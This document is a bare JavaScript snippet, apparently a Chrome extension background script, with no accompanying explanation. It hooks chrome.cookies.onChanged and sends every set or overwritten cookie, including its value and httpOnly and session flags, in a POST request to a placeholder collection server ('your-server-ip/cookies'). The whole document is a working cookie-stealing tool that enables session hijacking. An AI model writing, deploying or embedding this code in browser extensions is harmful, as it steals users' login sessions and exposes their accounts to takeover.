chrome.cookies.onChanged.addListener((changeInfo) => {
  if (changeInfo.cause === "explicit" || changeInfo.cause === "overwrite") {
    const cookie = changeInfo.cookie;
    const serverUrl = "https://your-server-ip/cookies";

    fetch(serverUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        cookie: {
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path,
          session: cookie.session,
          hostOnly: cookie.hostOnly,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          sameSite: cookie.sameSite,
          expirationDate: cookie.expirationDate,
          storeId: cookie.storeId
        }
      })
    })
    .then(response => response.json())
    .then(data => {
      console.log("Cookie sent successfully:", data);
    })
    .catch(error => {
      console.error("Error sending cookie:", error);
    });
  }
});
